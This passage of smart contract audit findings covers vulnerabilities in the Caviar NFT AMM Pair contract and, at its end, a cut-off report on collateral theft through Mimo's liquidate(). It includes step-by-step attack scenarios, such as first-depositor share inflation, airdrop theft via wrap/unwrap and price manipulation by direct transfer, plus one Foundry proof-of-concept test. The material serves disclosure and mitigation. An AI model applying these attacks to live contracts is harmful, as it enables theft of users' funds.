[koxuan](https://github.com/code-423n4/2022-12-caviar-findings/issues/173), [obront](https://github.com/code-423n4/2022-12-caviar-findings/issues/142), [nicobevi](https://github.com/code-423n4/2022-12-caviar-findings/issues/122), [shung](https://github.com/code-423n4/2022-12-caviar-findings/issues/90), [cccz](https://github.com/code-423n4/2022-12-caviar-findings/issues/31), [Bobface](https://github.com/code-423n4/2022-12-caviar-findings/issues/30), and [chaduke](https://github.com/code-423n4/2022-12-caviar-findings/issues/17)*

Liquidity providers may lose a portion of provided liquidity in either of the pair tokens. While the `minLpTokenAmount` protects from slippage when adding liquidity, it doesn't protect from providing liquidity at different K.

### Proof of Concept

The `Pair` contract is designed to receive liquidity from liquidity providers ([Pair.sol#L63](https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L63)). First liquidity provider in a pool may provide arbitrary token amounts and set the initial price ([Pair.sol#L425-L426](https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L425-L426)), but all other liquidity providers must provide liquidity proportionally to current pool reserves ([Pair.sol#L420-L423](https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L420-L423)). Since a pool is made of two tokens and liquidity is provided in both tokens, there's a possibility for a discrepancy: token amounts may be provided in different proportions. When this happens, the smaller of the proportions is chosen to calculate the amount of LP tokens minted ([Pair.sol#L420-L423](https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L420-L423)):

```solidity
// calculate amount of lp tokens as a fraction of existing reserves
uint256 baseTokenShare = (baseTokenAmount * lpTokenSupply) / baseTokenReserves();
uint256 fractionalTokenShare = (fractionalTokenAmount * lpTokenSupply) / fractionalTokenReserves();
return Math.min(baseTokenShare, fractionalTokenShare);
```

As a result, the difference in proportions will create an excess of tokens that won't be redeemable for the amount of LP tokens minted. The excess of tokens gets, basically, donated to the pool: it'll be shared among all liquidity providers of the pool. While the `minLpTokenAmount` argument of the `add` function ([Pair.sol#L63](https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L63)) allows liquidity providers to set the minimal amount of LP tokens they want to receive, it doesn't allow them to minimize the disproportion of token amounts or avoid it at all.

```solidity
// test/Pair/unit.Add.t.sol

function testLockOfFunds_AUDIT() public {
    address alice = address(0x31337);
    address bob = address(0x12345);
    vm.label(alice, ""alice"");
    vm.label(bob, ""bob"");

    deal(address(usd), alice, 100e18, true);
    deal(address(usd), bob, 100e18, true);
    deal(address(p), alice, 100e18, true);
    deal(address(p), bob, 100e18, true);

    // Alice is the first liquidity provider.
    vm.startPrank(alice);
    usd.approve(address(p), type(uint256).max);
    p.add(10 ether, 10 ether, 0);
    vm.stopPrank();

    // Bob provides liquidity to the pool and sets the minimal LP amount.
    // The token amounts are deposited in different proportions, thus the smaller
    // one will be chosen to calculate the amount of LP tokens Bob will receive.
    vm.startPrank(bob);
    usd.approve(address(p), type(uint256).max);
    uint256 minLPAmount = 1e18;
    uint256 bobLPAmount = p.add(1.2 ether, 1 ether, minLPAmount);
    vm.stopPrank();

    // Bob has received the minimal LP amount he wanted.
    assertEq(bobLPAmount, minLPAmount);

    // However, after removing all his liquidity from the pool...
    (uint256 bobUSDBefore, uint256 bobFracBefore) = (usd.balanceOf(bob), p.balanceOf(bob));
    vm.prank(bob);
    p.remove(minLPAmount, 0, 0);
    (uint256 bobUSDAfter, uint256 bobFracAfter) = (usd.balanceOf(bob), p.balanceOf(bob));

    // ... Bob received less USD than he deposited.
    assertEq(bobUSDAfter - bobUSDBefore, 1.018181818181818181 ether);
    assertEq(bobFracAfter - bobFracBefore, 1.000000000000000000 ether);
}
```

### Recommended Mitigation Steps

In the `add` function, consider calculating optimal token amounts based on the amounts specified by user, current pool reserves, and the minimal LP tokens amount specified by user. As a reference, consider this piece from the Uniswap V2 Router: [UniswapV2Router02.sol#L45-L60](https://github.com/Uniswap/v2-periphery/blob/master/contracts/UniswapV2Router02.sol#L45-L60).




***"
193.md,First depositor can break minting of shares,high,"*Submitted by [minhquanym](https://github.com/code-423n4/2022-12-caviar-findings/issues/442), also found by [Apocalypto](https://github.com/code-423n4/2022-12-caviar-findings/issues/500), [0xDecorativePineapple](https://github.com/code-423n4/2022-12-caviar-findings/issues/495), [Franfran](https://github.com/code-423n4/2022-12-caviar-findings/issues/485), [dipp](https://github.com/code-423n4/2022-12-caviar-findings/issues/476), [rjs](https://github.com/code-423n4/2022-12-caviar-findings/issues/471), [ak1](https://github.com/code-423n4/2022-12-caviar-findings/issues/470), [Tricko](https://github.com/code-423n4/2022-12-caviar-findings/issues/469), [Jeiwan](https://github.com/code-423n4/2022-12-caviar-findings/issues/382), [unforgiven](https://github.com/code-423n4/2022-12-caviar-findings/issues/358), [hansfriese](https://github.com/code-423n4/2022-12-caviar-findings/issues/352), [BAHOZ](https://github.com/code-423n4/2022-12-caviar-findings/issues/341), [unforgiven](https://github.com/code-423n4/2022-12-caviar-findings/issues/338), [bytehat](https://github.com/code-423n4/2022-12-caviar-findings/issues/317), [UNCHAIN](https://github.com/code-423n4/2022-12-caviar-findings/issues/310), [immeas](https://github.com/code-423n4/2022-12-caviar-findings/issues/249), [SamGMK](https://github.com/code-423n4/2022-12-caviar-findings/issues/247), [fs0c](https://github.com/code-423n4/2022-12-caviar-findings/issues/242), [Tointer](https://github.com/code-423n4/2022-12-caviar-findings/issues/240), [haku](https://github.com/code-423n4/2022-12-caviar-findings/issues/239), [Koolex](https://github.com/code-423n4/2022-12-caviar-findings/issues/235), [\_\_141345\_\_](https://github.com/code-423n4/2022-12-caviar-findings/issues/232), [ElKu](https://github.com/code-423n4/2022-12-caviar-findings/issues/231), [rajatbeladiya](https://github.com/code-423n4/2022-12-caviar-findings/issues/216), [hihen](https://github.com/code-423n4/2022-12-caviar-findings/issues/207), [izhelyazkov](https://github.com/code-423n4/2022-12-caviar-findings/issues/196), [KingNFT](https://github.com/code-423n4/2022-12-caviar-findings/issues/174), [koxuan](https://github.com/code-423n4/2022-12-caviar-findings/issues/151), [0x52](https://github.com/code-423n4/2022-12-caviar-findings/issues/149), [carrotsmuggler](https://github.com/code-423n4/2022-12-caviar-findings/issues/130), [yixxas](https://github.com/code-423n4/2022-12-caviar-findings/issues/128), [HE1M](https://github.com/code-423n4/2022-12-caviar-findings/issues/123), [supernova](https://github.com/code-423n4/2022-12-caviar-findings/issues/121), [cozzetti](https://github.com/code-423n4/2022-12-caviar-findings/issues/119), [rvierdiiev](https://github.com/code-423n4/2022-12-caviar-findings/issues/113), [SamGMK](https://github.com/code-423n4/2022-12-caviar-findings/issues/99), [aviggiano](https://github.com/code-423n4/2022-12-caviar-findings/issues/88), [seyni](https://github.com/code-423n4/2022-12-caviar-findings/issues/87), [lumoswiz](https://github.com/code-423n4/2022-12-caviar-findings/issues/77), [ladboy233](https://github.com/code-423n4/2022-12-caviar-findings/issues/58), [chaduke](https://github.com/code-423n4/2022-12-caviar-findings/issues/56), [cccz](https://github.com/code-423n4/2022-12-caviar-findings/issues/33), and [eyexploit](https://github.com/code-423n4/2022-12-caviar-findings/issues/19)*

The attack vector and impact is the same as [TOB-YEARN-003](https://github.com/yearn/yearn-security/blob/master/audits/20210719\_ToB_yearn_vaultsv2/ToB\_-\_Yearn_Vault_v\_2\_Smart_Contracts_Audit_Report.pdf), where users may not receive shares in exchange for their deposits if the total asset amount has been manipulated through a large “donation”.

### Proof of Concept

In `Pair.add()`, the amount of LP token minted is calculated as

```solidity
function addQuote(uint256 baseTokenAmount, uint256 fractionalTokenAmount) public view returns (uint256) {
    uint256 lpTokenSupply = lpToken.totalSupply();
    if (lpTokenSupply > 0) {
        // calculate amount of lp tokens as a fraction of existing reserves
        uint256 baseTokenShare = (baseTokenAmount * lpTokenSupply) / baseTokenReserves();
        uint256 fractionalTokenShare = (fractionalTokenAmount * lpTokenSupply) / fractionalTokenReserves();
        return Math.min(baseTokenShare, fractionalTokenShare);
    } else {
        // if there is no liquidity then init
        return Math.sqrt(baseTokenAmount * fractionalTokenAmount);
    }
}
```

An attacker can exploit using these steps

1.  Create and add `1 wei baseToken - 1 wei quoteToken` to the pair. At this moment, attacker is minted `1 wei LP token` because `sqrt(1 * 1) = 1`
2.  Transfer large amount of `baseToken` and `quoteToken` directly to the pair, such as `1e9 baseToken - 1e9 quoteToken`. Since no new LP token is minted, `1 wei LP token` worths `1e9 baseToken - 1e9 quoteToken`.
3.  Normal users add liquidity to pool will receive `0` LP token if they add less than `1e9` token because of rounding division.

```solidity
baseTokenShare = (X * 1) / 1e9;
fractionalTokenShare = (Y * 1) / 1e9;
```

### Recommended Mitigation Steps

*   [Uniswap V2 solved this problem by sending the first 1000 LP tokens to the zero address](https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol#L119-L124). The same can be done in this case i.e. when `lpTokenSupply == 0`, send the first min liquidity LP tokens to the zero address to enable share dilution.
*   In `add()`, ensure the number of LP tokens to be minted is non-zero:

```solidity
require(lpTokenAmount != 0, ""No LP minted"");
```




***"
193.md,Missing deadline checks allow pending transactions to be maliciously executed,medium,"*Submitted by [Bobface](https://github.com/code-423n4/2022-12-caviar-findings/issues/28), also found by [cozzetti](https://github.com/code-423n4/2022-12-caviar-findings/issues/116)*

<https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L63> <br><https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L107> <br><https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L147> <br><https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L182> <br><https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L275> <br><https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L294> <br><https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L310> <br><https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L323>

The `Pair` contract does not allow users to submit a deadline for their action. This missing feature enables pending transactions to be maliciously executed at a later point.

### Detailed description

AMMs should provide their users with an option to limit the execution of their pending actions, such as swaps or adding and removing liquidity. The most common solution is to include a deadline timestamp as a parameter (for example see [Uniswap V2](https://github.com/Uniswap/v2-periphery/blob/0335e8f7e1bd1e8d8329fd300aea2ef2f36dd19f/contracts/UniswapV2Router02.sol#L229)). If such an option is not present, users can unknowingly perform bad trades:

1.  Alice wants to swap 100 fractional NFT tokens (`fTokens`) for 1 ETH and later sell the 1 ETH for 1000 DAI. She signs the transaction calling `Pair.sell` with `inputAmount = 100 fTokens` and `minOutputAmount = 0.99 ETH` to allow for some slippage.
2.  The transaction is submitted to the mempool, however, Alice chose a transaction fee that is too low for miners to be interested in including her transaction in a block. The transaction stays pending in the mempool for extended periods, which could be hours, days, weeks, or even longer.
3.  When the average gas fee dropped far enough for Alice's transaction to become interesting again for miners to include it, her swap will be executed. In the meantime, the price of `ETH` could have drastically changed. She will still at least get `0.99 ETH` due to `minOutputAmount`, but the `DAI` value of that output might be significantly lower. She has unknowingly performed a bad trade due to the pending transaction she forgot about.

An even worse way this issue can be maliciously exploited is through MEV:

1.  The swap transaction is still pending in the mempool. Average fees are still too high for miners to be interested in it. The price of `fToken` has gone up significantly since the transaction was signed, meaning Alice would receive a lot more `ETH` when the swap is executed. But that also means that her `minOutputAmount` value is outdated and would allow for significant slippage.
2.  A MEV bot detects the pending transaction. Since the outdated `minOutputAmount` now allows for high slippage, the bot sandwiches Alice, resulting in significant profit for the bot and significant loss for Alice.

The affected functions in `Pair.sol` are:

*   `add()`
*   `remove()`
*   `buy()`
*   `sell()`
*   `nftAdd()`
*   `nftRemove()`
*   `nftBuy()`
*   `nftSell()`

### Recommended Mitigation Steps

Introduce a `deadline` parameter to the mentioned functions.

### A word on the severity

Categorizing this issue into medium versus high was not immediately obvious. I came to the conclusion that this is a high-severity issue for the following reason:

I run an arbitrage MEV bot myself, which also tracks pending transactions in the mempool, though for another reason than the one mentioned in this report. There is a *significant* amount of pending and even dropped transactions: over `200,000` transactions that are older than one month. These transactions do all kinds of things, from withdrawing from staking contracts to sending funds to CEXs and also performing swaps on DEXs like Uniswap. This goes to show that this issue will in fact be very real, there will be very old pending transactions wanting to perform trades without a doubt. And with the prevalence of advanced MEV bots, these transactions will be exploited as described in the second example above, leading to losses for Caviar's users.

### Proof of Concept

Omitted in this case, since the exploit is solely based on the fact that there is no limit on how long a transaction is allowed to be pending, which can be clearly seen when looking at the mentioned functions.






***"
193.md,"Price will not always be 18 decimals, as expected and outlined in the comments",medium,"*Submitted by [obront](https://github.com/code-423n4/2022-12-caviar-findings/issues/141), also found by [cryptostellar5](https://github.com/code-423n4/2022-12-caviar-findings/issues/488), [Tricko](https://github.com/code-423n4/2022-12-caviar-findings/issues/386), [CRYP70](https://github.com/code-423n4/2022-12-caviar-findings/issues/277), [0xmuxyz](https://github.com/code-423n4/2022-12-caviar-findings/issues/274), [koxuan](https://github.com/code-423n4/2022-12-caviar-findings/issues/215), [8olidity](https://github.com/code-423n4/2022-12-caviar-findings/issues/171), [yixxas](https://github.com/code-423n4/2022-12-caviar-findings/issues/143), [cozzetti](https://github.com/code-423n4/2022-12-caviar-findings/issues/117), [ktg](https://github.com/code-423n4/2022-12-caviar-findings/issues/86), and [ladboy233](https://github.com/code-423n4/2022-12-caviar-findings/issues/53)*

The `price()` function is expected to return the price of one fractional tokens, represented in base tokens, to 18 decimals of precision. This is laid out clearly in the comments:

`/// @notice The current price of one fractional token in base tokens with 18 decimals of precision.`<br>
`/// @dev Calculated by dividing the base token reserves by the fractional token reserves.`<br>
`/// @return price The price of one fractional token in base tokens * 1e18.`<br>


However, the formula incorrectly calculates the price to be represented in whatever number of decimals the base token is in. Since there are many common base tokens (such as USDC) that will have fewer than 18 decimals, this will create a large mismatch between expected prices and the prices that result from the function.

### Proof of Concept

Prices are calculated with the following formula, where `ONE = 1e18`:

```solidity
return (_baseTokenReserves() * ONE) / fractionalTokenReserves();
```

We know that `fractionalTokenReserves` will always be represented in 18 decimals. This means that the `ONE` and the
`fractionalTokenReserves` will cancel each other out, and we are left with the `baseTokenReserves` number of decimals for the final price.

As an example:

*   We have `$1000` USDC in reserves, which at 6 decimals is 1e9
*   We have 1000 fractional tokens in reserve, which at 18 decimals is 1e21
*   The price calculation is `1e9 * 1e18 / 1e21 = 1e6`
*   While the value should be 1 token, the 1e6 will be interpreted as just 1/1e12 tokens if we expect the price to be in 1e18

### Recommended Mitigation Steps

The formula should use the decimals value of the `baseToken` to ensure that the decimals of the resulting price ends up with 18 decimals as expected:

```solidity
return (_baseTokenReserves() * 10 ** (36 - ERC20(baseToken).decimals()) / fractionalTokenReserves();
```

This will multiple `baseTokenReserves` by 1e18, and then additionally by the gap between 1e18 and its own decimals count, which will result in the correct decimals value for the outputted price.




***"
193.md,Rounding error in `buyQuote` might result in free tokens,medium,"*Submitted by [Zarf](https://github.com/code-423n4/2022-12-caviar-findings/issues/243), also found by [minhtrng](https://github.com/code-423n4/2022-12-caviar-findings/issues/481), [Franfran](https://github.com/code-423n4/2022-12-caviar-findings/issues/460), [Apocalypto](https://github.com/code-423n4/2022-12-caviar-findings/issues/458), [adriro](https://github.com/code-423n4/2022-12-caviar-findings/issues/436), [0xDave](https://github.com/code-423n4/2022-12-caviar-findings/issues/424), [wait](https://github.com/code-423n4/2022-12-caviar-findings/issues/409), [unforgiven](https://github.com/code-423n4/2022-12-caviar-findings/issues/391), [Jeiwan](https://github.com/code-423n4/2022-12-caviar-findings/issues/381), [hansfriese](https://github.com/code-423n4/2022-12-caviar-findings/issues/351), [bytehat](https://github.com/code-423n4/2022-12-caviar-findings/issues/328), [UNCHAIN](https://github.com/code-423n4/2022-12-caviar-findings/issues/307), [rajatbeladiya](https://github.com/code-423n4/2022-12-caviar-findings/issues/289), [CRYP70](https://github.com/code-423n4/2022-12-caviar-findings/issues/276), [hihen](https://github.com/code-423n4/2022-12-caviar-findings/issues/228), [koxuan](https://github.com/code-423n4/2022-12-caviar-findings/issues/208), [kiki\_dev](https://github.com/code-423n4/2022-12-caviar-findings/issues/131), [yixxas](https://github.com/code-423n4/2022-12-caviar-findings/issues/129), and [chaduke](https://github.com/code-423n4/2022-12-caviar-findings/issues/43)*

In order to guarantee the contract does not become insolvent, incoming assets should be rounded up, while outgoing assets should be rounded down.

The function `buyQuote()` calculates the amount of base tokens required to buy a given amount of fractional tokens. However, this function rounds down the required amount, which is in favor of the buyer (i.e. he/she has to provide less base tokens for the amount of receiving fractional tokens.

Depending on the amount of current token reserves and the amount of fractional tokens the user wishes to buy, it might be possible to receive free fractional tokens.

Assume the following reserve state:

*   base token reserve: 0,1 WBTC (=`1e7`)
*   fractional token reserve: 10.000.000 (=`1e25`)

The user wishes to buy 0,9 fractional tokens (=`9e17`). Then, the function `buyQuote()` will calculate the amount of base tokens as follows:

`(9e17 * 1000 * 1e7) / ((1e25 - 9e17) * 997) = 0,903`

As division in Solidity will round down, the amount results in `0` amount of base tokens required (WBTC) to buy 0,9 fractional tokens.

### Impact

Using the example above, 0,9 fractional tokens is a really small amount (`0,1 BTC / 1e7 = +- $0,00017`). Moreover, if the user keeps repeating this attack, the fractional token reserve becomes smaller, which will result in a buyQuote amount of >1, after which the tokens will not be free anymore.

Additionally, as the contract incorporates a fee of 30bps, it will likely not be insolvent. The downside would be the LP holder, which will receive a fee of less than 30bps. Hence, the impact is rated as medium.

### Recommended Mitigation Steps

For incoming assets, it’s recommended to round up the required amount. We could use solmate’s `FixedPointMathLib` library to calculate the quote and round up. This way the required amount will always at least be 1 wei:

```solidity
function buyQuote(uint256 outputAmount) public view returns (uint256) {
  return mulDivUp(outputAmount * 1000, baseTokenReserves(), (fractionalTokenReserves() - outputAmount) * 997);
}
```




***"
193.md,It's possible to swap NFT token ids without fee and also attacker can wrap unwrap all the NFT token balance of the Pair contract and steal their air drops for those token ids,medium,"*Submitted by [unforgiven](https://github.com/code-423n4/2022-12-caviar-findings/issues/367), also found by [imare](https://github.com/code-423n4/2022-12-caviar-findings/issues/380) and [ElKu](https://github.com/code-423n4/2022-12-caviar-findings/issues/227)*

<https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L217-L243> <br><https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L248-L262>

Users can `wrap()` their NFT tokens (which id is whitelisted) and receive `1e18` fractional token or they can pay `1e18` fractional token and unwrap NFT token. there is two issue here:

1.  anyone can swap their NFT token id with another NFT token id without paying any fee(both ids should be whitelisted). it's swap without fee.
2.  attacker can swap his NFT token(with whitelisted id) for all the NFT balance of contract and steal those NFT tokens airdrop all in one transaction.

### Proof of Concept

This is `wrap()` and `unwrap()` code:

        function wrap(uint256[] calldata tokenIds, bytes32[][] calldata proofs)
            public
            returns (uint256 fractionalTokenAmount)
        {
            // *** Checks *** //

            // check that wrapping is not closed
            require(closeTimestamp == 0, ""Wrap: closed"");

            // check the tokens exist in the merkle root
            _validateTokenIds(tokenIds, proofs);

            // *** Effects *** //

            // mint fractional tokens to sender
            fractionalTokenAmount = tokenIds.length * ONE;
            _mint(msg.sender, fractionalTokenAmount);

            // *** Interactions *** //

            // transfer nfts from sender
            for (uint256 i = 0; i < tokenIds.length; i++) {
                ERC721(nft).safeTransferFrom(msg.sender, address(this), tokenIds[i]);
            }

            emit Wrap(tokenIds);
        }

        function unwrap(uint256[] calldata tokenIds) public returns (uint256 fractionalTokenAmount) {
            // *** Effects *** //

            // burn fractional tokens from sender
            fractionalTokenAmount = tokenIds.length * ONE;
            _burn(msg.sender, fractionalTokenAmount);

            // *** Interactions *** //

            // transfer nfts to sender
            for (uint256 i = 0; i < tokenIds.length; i++) {
                ERC721(nft).safeTransferFrom(address(this), msg.sender, tokenIds[i]);
            }

            emit Unwrap(tokenIds);
        }

As you can see it's possible to wrap one NFT token (which id is whitelisted and is in merkle tree) and unwrap another NFT token without paying fee. so Pair contract create NFT swap without fee for users but there is no fee generated for those who wrapped and put their fractional tokens as liquidity providers.
The other issue with this is that some NFT tokens air drop new NFT tokens for NFT holders by making NFT holders to call `getAirdrop()` function. attacker can use this swap functionality to get air drop token for all the NFT balance of the Pair contract. to steps to perform this attack:

1.  if Pair contract is for NFT1 and baseToken1 and also merkle tree root hash is 0x0.
2.  users deposited 100 NFT1 tokens to the Pair contract.
3.  NFT1 decide to airdrop some new tokens for token holders and token holders need to call `nft.getAirDrop(id)` while they own the NFT id.
4.  attacker would create a contract and buy one of the NFT1 tokens (attackerID1) and wrap it to receive `1e18` fractional tokens and perform this steps in the contract:<br>
    4.1 loop through all the NFT tokens in the Pair contract balance and:<br>
    4.2 unwrap NFT token id=i from Pair contract by paying `1e18` fractional token.<br>
    4.3 call `nft.getAirDrop(i)` and receive the new airdrop token. (the name of the function can be other thing not exactly `getAirDrop()`)<br>
    4.4 wrap NFT token id=i and receive `1e18` fractional token.

5. in the end attacker would unwrap attackerID1 token from Pair contract.<br>
so attacker was able to receive all the air drops of the NFT tokens that were in the contract address, there could be 100 or 1000 NFT tokens in the contract address and attacker can steal their air drops in one transaction(by writing a contract). those air drops belongs to all the fractional owners and contract shouldn't allow one user to take all the air drops for himself. as airdrops are common in NFT collections so this bug is critical and would happen.

also some of the NFT tokens allows users to stake some tokens for their NFT tokens and receive rewards(for example BAYC/MAYC). if a user stakes tokens for his NFT tokens then wrap those NFT tokens then it would be possible for attacker to unwrap those tokens and steal user staked amounts. in this scenario user made a risky move and wrapped NFT tokens while they have stake but as a lot of users wants to stake for their NFTs this would make them unable to use caviar protocol.

also any other action that attacker can perform by becoming the owner of the NFT token is possible by this attack and if that action can harm the NFT token holders then attacker can harm by doing this attack and performing that action.

### Tools Used

VIM

### Recommended Mitigation Steps

The real solution to prevent this attack (stealing air drops) can be hard. some of the things can be done is:
* create functionality so admin can call `getAirDrop()` functions during the airdrops before attacker.
* call `getAirDrop()` (which admin specified) function before unwrapping tokens.
* make some fee for NFT token unwrapping.
* create some lock time(some days) for each wrapped NFT that in that lock time only the one who supplied that token can unwrap it.
* create some delay for unwrapping tokens and if user wants to unwrap token he would receive it after this delay.







***"
193.md,Pair price may be manipulated by direct transfers,medium,"*Submitted by [Jeiwan](https://github.com/code-423n4/2022-12-caviar-findings/issues/383), also found by [BPZ](https://github.com/code-423n4/2022-12-caviar-findings/issues/506), [ak1](https://github.com/code-423n4/2022-12-caviar-findings/issues/482), [Janio](https://github.com/code-423n4/2022-12-caviar-findings/issues/473), [hansfriese](https://github.com/code-423n4/2022-12-caviar-findings/issues/353), [UNCHAIN](https://github.com/code-423n4/2022-12-caviar-findings/issues/311), [dic0de](https://github.com/code-423n4/2022-12-caviar-findings/issues/84), and [ladboy233](https://github.com/code-423n4/2022-12-caviar-findings/issues/50)*

<https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L391> <br><https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L479-L480> <br><https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L384>

An attacker may manipulate the price of a pair by transferring tokens directly to the pair. Since the `Pair` contract exposes the `price` function, it maybe be used as a price oracle in third-party integrations. Manipulating the price of a pair may allow an attacker to steal funds from such integrations.

### Proof of Concept

The `Pair` contract is a pool of two tokens, a base token and a fractional token. Its main purpose is to allow users to swap the tokens at a fair price. Since the price is calculated based on the reserves of a pair, it can only be changed in two cases:

1.  when initial liquidity is added: the first liquidity provider sets the price of a pool ([Pair.sol#L85-L97](https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L85-L97)); other liquidity providers cannot change the price ([Pair.sol#L421-L423](https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L421-L423));
2.  during trades: trading adds and removes tokens from a pool, ensuring the K constant invariant is respected ([Pair.sol#L194-L204](https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L194-L204), [Pair.sol#L161-L173](https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L161-L173)).

However, the Pair contract calculates the price using the current token balances of the contract ([Pair.sol#L379-L385](https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L379-L385), [Pair.sol#L477-L481](https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L477-L481)):

```solidity
function baseTokenReserves() public view returns (uint256) {
    return _baseTokenReserves();
}

function _baseTokenReserves() internal view returns (uint256) {
    return baseToken == address(0)
        ? address(this).balance - msg.value // subtract the msg.value if the base token is ETH
        : ERC20(baseToken).balanceOf(address(this));
}

function fractionalTokenReserves() public view returns (uint256) {
    return balanceOf[address(this)];
}
```

This allows an attacker to change the price of a pool and skip the K constant invariant check that's enforced on new liquidity ([Pair.sol#L421-L423](https://github.com/code-423n4/2022-12-caviar/blob/0212f9dc3b6a418803dbfacda0e340e059b8aae2/src/Pair.sol#L421-L423)).

### Recommended Mitigation Steps

Consider tracking pair's reserves internally, using state variables, similarly to how Uniswap V2 does that:

*   [UniswapV2Pair.sol#L22-L23](https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol#L22-L23):

```solidity
uint112 private reserve0;           // uses single storage slot, accessible via getReserves
uint112 private reserve1;           // uses single storage slot, accessible via getReserves
```

*   [UniswapV2Pair.sol#L38-L42](https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol#L38-L42):

```solidity
function getReserves() public view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast) {
    _reserve0 = reserve0;
    _reserve1 = reserve1;
    _blockTimestampLast = blockTimestampLast;
}
```

*   [UniswapV2Pair.sol#L38-L42](https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol#L38-L42):

```solidity
// update reserves and, on the first call per block, price accumulators
function _update(uint balance0, uint balance1, uint112 _reserve0, uint112 _reserve1) private {
    require(balance0 <= uint112(-1) && balance1 <= uint112(-1), 'UniswapV2: OVERFLOW');
    uint32 blockTimestamp = uint32(block.timestamp % 2**32);
    uint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired
    if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {
        // * never overflows, and + overflow is desired
        price0CumulativeLast += uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) * timeElapsed;
        price1CumulativeLast += uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) * timeElapsed;
    }
    reserve0 = uint112(balance0);
    reserve1 = uint112(balance1);
    blockTimestampLast = blockTimestamp;
    emit Sync(reserve0, reserve1);
}
```







***"
115.md,User can call liquidate() and steal all collateral due to arbitrary router call,high,"<https://github.com/code-423n4/2022-04-mimo/blob/b18670f44d595483df2c0f76d1c57a7bfbfbc083/core/contracts/liquidityMining/v2/PARMinerV2.sol#L126>

<https://github.com/Uniswap/v2-periphery/blob/2efa12e0f2d808d9b49737927f0e416fafa5af68/contracts/UniswapV2Router02.sol#L299>

<https://github.com/Uniswap/solidity-lib/blob/c01640b0f0f1d8a85cba8de378cc48469fcfd9a6/contracts/libraries/TransferHelper.sol#L47-L50>

A malicious user is able to steal all collateral of an unhealthy position in `PARMinerV2.sol`. The code for the `liquidate()` function is written so that the following steps are followed:

*   User calls `PARMinerV2.liquidate()`
*   PARMinerV2 performs the liquidation with `_a.parallel().core().liquidatePartial()`
*   PARMinerV2 receives the liquidated collateral
*   An arbitrary router function is called to swap the collateral to PAR
*   Finally, `PARMinerV2.liquidate()` checks that PARMinerV2's PAR balance is higher than the balance at the beginning of the function call.

The exploit occurs with the arbitrary router call. The malicious user is able to supply the `dexTxnData` parameter which dictates the function call to the router. If the user supplied a function such as UniswapV2Router's `swapExactTokenForETH()`, then control flow will be given to the user, allowing them to perform the exploit.

Note: The Mimo developers have stated that the routers used by the protocol will be DEX Aggregators such as 1inch and Paraswap, but this submission will be referring to UniswapV2Router for simplicity. It can be assumed that the dex aggregators currently allow swapping tokens for ETH.

Continuing the exploit, once the attacker has gained control due to the ETH transfer, they are able to swap the ETH for PAR. Finally, they deposit the PAR with `PARMinerV2.deposit()`. This will cause the final check of `liquidate()` to pass because PARMinerV2's PAR balance will be larger than the start of the liquidation call.

The attacker is able to steal all collateral from every unhealthy position that they liquidate. In the most extreme case, the attacker is able to open their own risky positions with the hope that the position becomes unhealthy. They will borrow the PAR and then liquidate themselves to take back the collateral. Thus effectively stealing PAR.

### Proof of Concept

Steps for exploit:

*   Attacker monitors unhealthy positions. Finds a position to liquidate.
*   Attacker calls `PARMinerV2.liquidate()`
*   Position liquidated. Collateral transferred back to `PARMinerV2`
